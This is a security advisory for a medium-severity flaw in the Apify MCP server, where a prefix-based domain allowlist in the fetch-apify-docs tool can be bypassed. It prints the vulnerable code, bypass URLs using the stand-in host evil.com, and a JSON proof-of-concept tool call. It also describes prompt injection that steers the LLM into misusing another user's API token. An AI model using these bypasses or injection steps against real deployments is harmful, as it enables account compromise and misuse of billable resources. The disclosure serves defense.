# [M] Apify Model Context Protocol (MCP) server: Domain Allowlist Bypass in fetch-apify-docs via String Prefix Matching

## Summary
Severity: Medium
Advisory: GHSA-jwp7-wg77-3w9v
CVE: CVE-2026-46341
CWE: CWE-183, CWE-20
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-jwp7-wg77-3w9v
Type: github-advisory

## Affected
- npm: `@apify/actors-mcp-server` — affected >=0 <0.9.21

## Details
### Summary
The `fetch-apify-docs` tool validates URLs against a domain allowlist using `String.startsWith()` instead of proper URL hostname comparison. This allows bypass via attacker-controlled subdomains (e.g., `https://docs.apify.com.evil.com/`), enabling the tool to fetch and return arbitrary web content to the LLM.

### Details
#### Vulnerable component

`src/tools/common/fetch_apify_docs.ts`, line 51:

```typescript
const isAllowedDomain = ALLOWED_DOC_DOMAINS.some((domain) => url.startsWith(domain));
```

`src/const.ts`, lines 167-170:

```typescript
export const ALLOWED_DOC_DOMAINS = [
    'https://docs.apify.com',
    'https://crawlee.dev',
] as const;
```

#### How the bypass works

`String.startsWith('https://docs.apify.com')` matches any string beginning with that prefix, including:

- `https://docs.apify.com.evil.com/payload` - attacker-controlled subdomain
- `https://docs.apify.com@evil.com/payload` - userinfo component in URL (browser behavior varies, but `fetch()` in Node.js may follow this)
- `https://docs.apify.com.evil.com:8080/path` - custom port on attacker domain

All of these pass the `startsWith` check because they begin with the exact string `https://docs.apify.com`.

#### The fetched content is returned to the LLM

After the allowlist check passes, the tool fetches the URL and returns the full page content as markdown (`fetch_apify_docs.ts:69-103`):

```typescript
const response = await fetch(url);
// ...
const html = await response.text();
markdown = htmlToMarkdown(html);
// ...
return buildMCPResponse({ texts: [`Fetched content from ${url}:\n\n${markdown}`], ... });
```

The HTML is converted to markdown and returned verbatim to the LLM. This creates a prompt injection vector - the attacker's page can contain instructions that the LLM may follow.

While tools like `get-html-skeleton` have no domain allowlist at all - it accepts any URL. The `fetch-apify-docs` tool was clearly intended to be more restricted (documentation-only), but the `startsWith` check defeats that intent.

### PoC
```json
{
  "method": "tools/call",
  "params": {
    "name": "fetch-apify-docs",
    "arguments": {
      "url": "https://docs.apify.com.evil.com/prompt-injection-payload"
    }
  }
}
```

The URL passes the `startsWith('https://docs.apify.com')` check, fetches the attacker's page, and returns its content to the LLM.
### Impact
- **Prompt injection via fetched content**: Attacker hosts a page at `docs.apify.com.evil.com` containing LLM instructions. When the tool fetches and returns this content, the LLM may follow the injected instructions.
- **Security boundary violation**: The allowlist was explicitly designed to restrict fetching to trusted documentation domains. The bypass defeats this intent.
- **SSRF (limited)**: The tool can fetch from attacker-controlled servers, though the primary risk is the content returned to the LLM rather than network access.
- **Account compromise via _meta.apifyToken**: Injected prompt instructions can direct the LLM to include a specific `_meta.apifyToken` (the server's per-request token feature) in subsequent `call-actor` invocations, redirecting billable operations to a victim's account or accessing their private Actors

## References
- https://github.com/apify/apify-mcp-server/security/advisories/GHSA-jwp7-wg77-3w9v
- https://github.com/apify/apify-mcp-server
